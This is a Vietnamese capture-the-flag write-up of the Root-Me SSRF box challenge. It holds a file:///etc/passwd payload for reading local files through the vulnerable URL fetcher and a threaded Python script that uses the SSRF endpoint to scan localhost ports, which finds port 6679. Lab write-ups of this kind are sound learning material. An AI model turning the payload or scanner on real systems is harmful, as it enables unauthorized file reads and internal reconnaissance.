# Trần Mạnh Huy

```
Statement
Objectif final : Get root privileges on SSRF box CTF All The Day to read the flag in the /root directory !
Validation flag is stored in the file /passwd

```
Ở đây web app cho mình nhập một url và nó sẽ thực hiện crawl dữ liệu từ cái url về, thử với đường dẫn http://youtube.com 

![](https://github.com/manhhuy2002/hello-world/blob/main/ssrf_rootme/ssrf_01.jpg)

Để test lỗ hổng ssrf, ta có thể fuzz qua 1 số payload như: file:///etc/passwd

![](https://github.com/manhhuy2002/hello-world/blob/main/ssrf_rootme/ssrf_02.jpg)

Nhưng bằng cách này thì ta không thể dọc các file root mà chỉ có thể đọc được các file trong quyền của mình, nên sẽ kh đọc được flag. Vì vậy ta tiếp tục fuzz 
tiếp xem những port nào trên local đang chạy. Ở đây ta có thể dùng  Intruder của burp để phát hiện các cổng dịch vụ đang mở hoặc dùng script.

![](https://github.com/manhhuy2002/hello-world/blob/main/ssrf_rootme/ssrf_03.jpg)

![](https://github.com/manhhuy2002/hello-world/blob/main/ssrf_rootme/ssrf_04.jpg)


Hoặc script:

```
import threading,requests
from queue import Queue
 
def scan(port):
    h={"Content-Type": "application/x-www-form-urlencoded",}
    url= "http://ctf09.root-me.org/index.php"
    data={"url":f"localhost:{port}"}
    r= requests.post(url,data=data)
    if "Connection refused" not in r.text:
        print(f"[+] FOUND AT PORT: {port}")
 
def threader():
    while True:
        worker = q.get()
        scan(worker)
        q.task_done()
 
q = Queue()
for i in range(100):
    t = threading.Thread(target=threader)
    t.daemon = True
    t.start()
 
for worker in range(1, 10000):
    q.put(worker)
 
q.join()

```

![](https://github.com/manhhuy2002/hello-world/blob/main/ssrf_rootme/ssrf_05.jpg)

![](https://github.com/manhhuy2002/hello-world/blob/main/ssrf_rootme/ssrf_06.jpg)


Như vậy có cổng dịch vụ đang mở nữa là 6679
